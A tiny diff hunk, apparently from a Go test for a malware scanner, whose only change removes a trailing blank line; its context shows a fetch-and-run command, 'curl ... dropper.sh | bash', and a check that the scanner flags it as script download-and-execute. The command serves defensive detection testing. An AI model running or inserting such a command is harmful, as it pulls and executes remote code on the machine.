@@ -259,4 +259,3 @@ curl -s http://192.168.1.50/dropper.sh | bash
 		t.Errorf("expected multi-signal scan to detect Script_Download_And_Execute in decoded stream")
 	}
 }
-
